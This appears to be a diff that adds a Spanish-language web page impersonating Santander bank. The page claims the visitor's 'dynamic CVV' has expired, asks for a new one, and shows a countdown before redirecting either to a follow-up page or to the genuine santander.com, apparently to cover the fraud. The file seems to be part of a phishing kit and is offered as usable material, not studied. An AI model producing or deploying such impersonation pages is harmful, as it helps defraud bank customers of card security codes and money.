@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando... | Santander</title>
+    <style>
+        /* Estilos generales del cuerpo */
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        /* Estilos del header */
+        .header {
+            width: 100%;
+            background-color: #ffffff;
+            padding: 20px 0;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        /* Contenedor de la página de carga */
+        .loading-container {
+            text-align: center;
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 500px;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            margin-top: 100px; /* Ajustado para el espacio del header */
+        }
+
+        /* Título de la página de carga */
+        .loading-container h1 {
+            color: #000080;
+            font-size: 2rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        /* Subtítulo o mensaje adicional */
+        .loading-container p {
+            font-size: 1.2rem;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        /* Animación de carga */
+        .loader {
+            border: 12px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 12px solid #000080;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Temporizador */
+        .timer {
+            font-size: 1.5rem;
+            color: #000080;
+            font-weight: 700;
+            margin-top: 20px;
+        }
+
+        /* Detalles decorativos */
+        .loading-container::before {
+            content: '';
+            position: absolute;
+            top: 10%;
+            left: 50%;
+            width: 120%;
+            height: 120%;
+            background: radial-gradient(circle, rgba(236,0,0,0.1) 0%, rgba(236,0,0,0) 100%);
+            transform: translateX(-50%);
+            z-index: -1;
+        }
+
+        /* Estilos responsive */
+        @media (max-width: 768px) {
+            .loading-container {
+                width: 90%;
+                padding: 20px;
+            }
+
+            .loading-container h1 {
+                font-size: 1.5rem;
+            }
+
+            .loading-container p {
+                font-size: 1rem;
+            }
+
+            .loader {
+                width: 60px;
+                height: 60px;
+                border-width: 8px;
+            }
+
+            .timer {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header con el logo de Santander -->
+    <header class="header">
+        <img src="https://cdn.worldvectorlogo.com/logos/logotipo-de-bbva.svg" alt="Logo Santander">
+    </header>
+
+    <!-- Contenedor de carga -->
+    <div class="loading-container">
+        <h1>CVV Dinámico vencido</h1>
+        <p>Por favor, ingrese su nuevo CVV Dinámico para continuar.</p>
+
+        <!-- Animación de carga -->
+        <div class="loader"></div>
+
+        <!-- Temporizador -->
+        <div class="timer" id="countdown">60 segundos...</div>
+    </div>
+
+    <script>
+        // Función para redirigir basándose en el parámetro 'action'
+        function redirectToPage() {
+            const params = new URLSearchParams(window.location.search);
+            const action = params.get('action');
+
+            let seconds = 60; // Tiempo en segundos
+            const countdownElement = document.getElementById('countdown');
+
+            const interval = setInterval(() => {
+                seconds--;
+                const minutes = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                countdownElement.textContent = `${minutes}:${secs < 10 ? '0' : ''}${secs} segundos...`;
+
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    if (action === 'telefono') {
+                        window.location.href = 'index2.html';
+                    } else if (action === 'token') {
+                        window.location.href = 'https://santander.com';
+                    }
+                }
+            }, 1000);
+        }
+
+        // Ejecutar la función cuando la página haya cargado
+        window.onload = redirectToPage;
+    </script>
+</body>
+</html>
